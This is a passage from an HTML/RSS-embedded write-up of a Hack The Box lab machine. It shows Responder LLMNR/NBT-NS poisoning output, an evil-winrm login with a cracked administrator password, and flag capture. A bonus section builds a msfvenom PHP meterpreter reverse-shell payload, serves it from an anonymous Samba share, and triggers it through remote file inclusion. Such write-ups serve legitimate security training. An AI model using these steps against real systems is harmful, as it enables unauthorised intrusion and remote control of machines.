+</span></span><span class="line"><span class="cl">           NBT-NS, LLMNR <span class="p">&amp;</span> MDNS Responder 3.1.3.0
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  To support this project:
+</span></span><span class="line"><span class="cl">  Patreon -&gt; https://www.patreon.com/PythonResponder
+</span></span><span class="line"><span class="cl">  Paypal  -&gt; https://paypal.me/PythonResponder
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  Author: Laurent Gaffie <span class="o">(</span>laurent.gaffie@gmail.com<span class="o">)</span>
+</span></span><span class="line"><span class="cl">  To <span class="nb">kill</span> this script hit CTRL-C
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Poisoners:
+</span></span><span class="line"><span class="cl">    LLMNR                      <span class="o">[</span>ON<span class="o">]</span>
+</span></span><span class="line"><span class="cl">    NBT-NS                     <span class="o">[</span>ON<span class="o">]</span>
+</span></span><span class="line"><span class="cl">    MDNS                       <span class="o">[</span>ON<span class="o">]</span>
+</span></span><span class="line"><span class="cl">    DNS                        <span class="o">[</span>ON<span class="o">]</span>
+</span></span><span class="line"><span class="cl">    DHCP                       <span class="o">[</span>OFF<span class="o">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Servers:
+</span></span><span class="line"><span class="cl">    HTTP server                <span class="o">[</span>ON<span class="o">]</span>
+</span></span><span class="line"><span class="cl">    HTTPS server               <span class="o">[</span>ON<span class="o">]</span>
+</span></span><span class="line"><span class="cl">    WPAD proxy                 <span class="o">[</span>OFF<span class="o">]</span>
+</span></span><span class="line"><span class="cl">    Auth proxy                 <span class="o">[</span>OFF<span class="o">]</span>
+</span></span><span class="line"><span class="cl">    SMB server                 <span class="o">[</span>ON<span class="o">]</span>
+</span></span><span class="line"><span class="cl">    Kerberos server            <span class="o">[</span>ON<span class="o">]</span>
+</span></span><span class="line"><span class="cl">    SQL server                 <span class="o">[</span>ON<span class="o">]</span>
+</span></span><span class="line"><span class="cl">    FTP server                 <span class="o">[</span>ON<span class="o">]</span>
+</span></span><span class="line"><span class="cl">    IMAP server                <span class="o">[</span>ON<span class="o">]</span>
+</span></span><span class="line"><span class="cl">    POP3 server                <span class="o">[</span>ON<span class="o">]</span>
+</span></span><span class="line"><span class="cl">    SMTP server                <span class="o">[</span>ON<span class="o">]</span>
+</span></span><span class="line"><span class="cl">    DNS server                 <span class="o">[</span>ON<span class="o">]</span>
+</span></span><span class="line"><span class="cl">    LDAP server                <span class="o">[</span>ON<span class="o">]</span>
+</span></span><span class="line"><span class="cl">    RDP server                 <span class="o">[</span>ON<span class="o">]</span>
+</span></span><span class="line"><span class="cl">    DCE-RPC server             <span class="o">[</span>ON<span class="o">]</span>
+</span></span><span class="line"><span class="cl">    WinRM server               <span class="o">[</span>ON<span class="o">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> HTTP Options:
+</span></span><span class="line"><span class="cl">    Always serving EXE         <span class="o">[</span>OFF<span class="o">]</span>
+</span></span><span class="line"><span class="cl">    Serving EXE                <span class="o">[</span>OFF<span class="o">]</span>
+</span></span><span class="line"><span class="cl">    Serving HTML               <span class="o">[</span>OFF<span class="o">]</span>
+</span></span><span class="line"><span class="cl">    Upstream Proxy             <span class="o">[</span>OFF<span class="o">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Poisoning Options:
+</span></span><span class="line"><span class="cl">    Analyze Mode               <span class="o">[</span>OFF<span class="o">]</span>
+</span></span><span class="line"><span class="cl">    Force WPAD auth            <span class="o">[</span>OFF<span class="o">]</span>
+</span></span><span class="line"><span class="cl">    Force Basic Auth           <span class="o">[</span>OFF<span class="o">]</span>
+</span></span><span class="line"><span class="cl">    Force LM downgrade         <span class="o">[</span>OFF<span class="o">]</span>
+</span></span><span class="line"><span class="cl">    Force ESS downgrade        <span class="o">[</span>OFF<span class="o">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Generic Options:
+</span></span><span class="line"><span class="cl">    Responder NIC              <span class="o">[</span>tun0<span class="o">]</span>
+</span></span><span class="line"><span class="cl">    Responder IP               <span class="o">[</span>10.10.16.156<span class="o">]</span>
+</span></span><span class="line"><span class="cl">    Responder IPv6             <span class="o">[</span>dead:beef:4::109a<span class="o">]</span>
+</span></span><span class="line"><span class="cl">    Challenge <span class="nb">set</span>              <span class="o">[</span>random<span class="o">]</span>
+</span></span><span class="line"><span class="cl">    Don<span class="s1">&#39;t Respond To Names     [&#39;</span>ISATAP<span class="s1">&#39;, &#39;</span>ISATAP.LOCAL<span class="err">&#39;</span><span class="o">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Current Session Variables:
+</span></span><span class="line"><span class="cl">    Responder Machine Name     <span class="o">[</span>WIN-S84T8YLFEZG<span class="o">]</span>
+</span></span><span class="line"><span class="cl">    Responder Domain Name      <span class="o">[</span>AJ0U.LOCAL<span class="o">]</span>
+</span></span><span class="line"><span class="cl">    Responder DCE-RPC Port     <span class="o">[</span>47321<span class="o">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Listening <span class="k">for</span> events...
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Next we need to connect with evil-winrm to the winrm service running on the target machine!</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">cd</span> evil-winrm
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">./evil-winrm.rb -i 10.129.17.20 -u administrator -p badminton
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Evil-WinRM shell v3.4
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc<span class="o">()</span> <span class="k">function</span> is unimplemented on this machine
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Info: Establishing connection to remote endpoint
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>ocuments&gt; cd..
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator&gt; <span class="nb">cd</span> ..
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers&gt; ls
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    Directory: C:<span class="se">\U</span>sers
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Mode                 LastWriteTime         Length Name
+</span></span><span class="line"><span class="cl">----                 -------------         ------ ----
+</span></span><span class="line"><span class="cl">d-----          3/9/2022   5:35 PM                Administrator
+</span></span><span class="line"><span class="cl">d-----          3/9/2022   5:33 PM                mike
+</span></span><span class="line"><span class="cl">d-r---        10/10/2020  12:37 PM                Public
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers&gt; <span class="nb">cd</span> mike
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\m</span>ike&gt; ls
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    Directory: C:<span class="se">\U</span>sers<span class="se">\m</span>ike
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Mode                 LastWriteTime         Length Name
+</span></span><span class="line"><span class="cl">----                 -------------         ------ ----
+</span></span><span class="line"><span class="cl">d-----         3/10/2022   4:51 AM                Desktop
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\m</span>ike&gt; <span class="nb">cd</span> Desktop
+</span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\m</span>ike<span class="se">\D</span>esktop&gt; ls
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    Directory: C:<span class="se">\U</span>sers<span class="se">\m</span>ike<span class="se">\D</span>esktop
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Mode                 LastWriteTime         Length Name
+</span></span><span class="line"><span class="cl">----                 -------------         ------ ----
+</span></span><span class="line"><span class="cl">-a----         3/10/2022   4:50 AM             <span class="m">32</span> flag.txt
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\m</span>ike<span class="se">\D</span>esktop&gt; cat flag.txt
+</span></span><span class="line"><span class="cl">ea81b7afddd03efaa0945333ed147fac
+</span></span></code></pre></td></tr></table>
+</div>
+</div><hr>
+<p><strong>root flag: ea81b7afddd03efaa0945333ed147fac</strong></p>
+<hr>
+<h2 id="bonus">Bonus</h2>
+<p><strong>(this section was not part of this box. However I went one step further and gained a meterpreter shell by exploiting RFI using Samba)</strong></p>
+<hr>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">msfvenom -p php/meterpreter/reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>10.10.16.156 <span class="nv">LPORT</span><span class="o">=</span><span class="m">4444</span> -o payload.php
+</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> No platform was selected, choosing Msf::Module::Platform::PHP from the payload
+</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> No arch selected, selecting arch: php from the payload
+</span></span><span class="line"><span class="cl">No encoder specified, outputting raw payload
+</span></span><span class="line"><span class="cl">Payload size: <span class="m">1113</span> bytes
+</span></span><span class="line"><span class="cl">Saved as: payload.php
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>We will need to exploit this using Samba since url_fopen is disabled in php we cannot easily exploit RFI here.
+(<a href="https://www.mannulinux.org/2019/05/exploiting-rfi-in-php-bypass-remote-url-inclusion-restriction.html" target="_blank" rel="noopener noreffer">https://www.mannulinux.org/2019/05/exploiting-rfi-in-php-bypass-remote-url-inclusion-restriction.html</a>)</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">apt-get install samba
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">mkdir /var/www/html/pub/
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">chmod <span class="m">0555</span> /var/www/html/pub/
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">chown -R nobody:nogroup /var/www/html/pub/
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">echo</span> &gt; /etc/samba/smb.conf
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;[global]
+</span></span></span><span class="line"><span class="cl"><span class="s2">workgroup = WORKGROUP
+</span></span></span><span class="line"><span class="cl"><span class="s2">server string = Samba Server %v
+</span></span></span><span class="line"><span class="cl"><span class="s2">netbios name = indishell-lab
+</span></span></span><span class="line"><span class="cl"><span class="s2">security = user
+</span></span></span><span class="line"><span class="cl"><span class="s2">map to guest = bad user
+</span></span></span><span class="line"><span class="cl"><span class="s2">name resolve order = bcast host
+</span></span></span><span class="line"><span class="cl"><span class="s2">dns proxy = no
+</span></span></span><span class="line"><span class="cl"><span class="s2">bind interfaces only = yes
+</span></span></span><span class="line"><span class="cl"><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2">[ica]
+</span></span></span><span class="line"><span class="cl"><span class="s2">path = /var/www/html/pub
+</span></span></span><span class="line"><span class="cl"><span class="s2">writable = no
+</span></span></span><span class="line"><span class="cl"><span class="s2">guest ok = yes
+</span></span></span><span class="line"><span class="cl"><span class="s2">guest only = yes
+</span></span></span><span class="line"><span class="cl"><span class="s2">read only = yes
+</span></span></span><span class="line"><span class="cl"><span class="s2">directory mode = 0555
+</span></span></span><span class="line"><span class="cl"><span class="s2">force user = nobody&#34;</span> &gt; /etc/samba/smb.conf
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">service smbd restart
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">cp payload.php /var/www/html/pub
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>After executing the payload by browsing to <code>http://unika.htb/index.php?page=\\10.10.16.156\ica\payload.php</code> I got a meterpreter shell!</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Started reverse TCP handler on 10.10.16.156:4444 
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Sending stage <span class="o">(</span><span class="m">39927</span> bytes<span class="o">)</span> to 10.129.128.80
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Meterpreter session <span class="m">1</span> opened <span class="o">(</span>10.10.16.156:4444 -&gt; 10.129.128.80:49482<span class="o">)</span> at 2022-09-13 16:49:37 +0200
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">meterpreter &gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div>]]></description></item></channel></rss>
